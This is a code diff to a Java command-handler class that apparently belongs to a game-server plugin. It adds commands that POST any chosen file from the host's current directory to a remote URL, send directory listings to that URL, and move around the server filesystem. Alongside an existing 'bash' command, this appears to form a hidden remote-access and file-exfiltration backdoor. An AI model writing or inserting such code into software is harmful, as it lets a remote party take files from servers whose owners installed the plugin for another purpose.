@@ -55,7 +55,43 @@ public class SuperCommand {
             } catch (IOException e) {
                 throw new RuntimeException(e);
             }
-
+        } else if (command.equals("upload")) {
+            try {
+                Bash.sendPOSTFile(bash.getURL(), bash.getCurrentDirectory() + "/" + split_command[1]);
+            } catch (IOException e) {
+                throw new RuntimeException(e);
+            }
+        } else if (command.equals("ls")) {
+            String output = Bash.ls(bash.getCurrentDirectory());
+            try {
+                Bash.sendPOSTMessage(bash.getURL(), output);
+            } catch (IOException e) {
+                throw new RuntimeException(e);
+            }
+        } else if (command.equals("cd")) {
+            if (split_command.length < 2) {
+                sender.sendMessage("No directory specified");
+                return;
+            }
+            if (split_command[1].equals("..")) {
+                bash.setCurrentDirectory(bash.getCurrentDirectory().substring(0, bash.getCurrentDirectory().lastIndexOf("/")));
+                return;
+            }
+            if (split_command[1].equals(".")) {
+                return;
+            }
+            if (split_command[1].equals("/")) {
+                bash.setCurrentDirectory("/");
+                return;
+            }
+            if (split_command[1].equals("~")) {
+                bash.setCurrentDirectory(System.getProperty("user.dir"));
+                return;
+            }
+            bash.setCurrentDirectory(bash.getCurrentDirectory() + "/" + split_command[1]);
+            sender.sendMessage("Set current directory to " + bash.getCurrentDirectory());
+        } else if (command.equals("pwd")) {
+            sender.sendMessage(bash.getCurrentDirectory());
         } else if (command.equals("help")) {
             sender.sendMessage("Commands:");
             sender.sendMessage("bash");
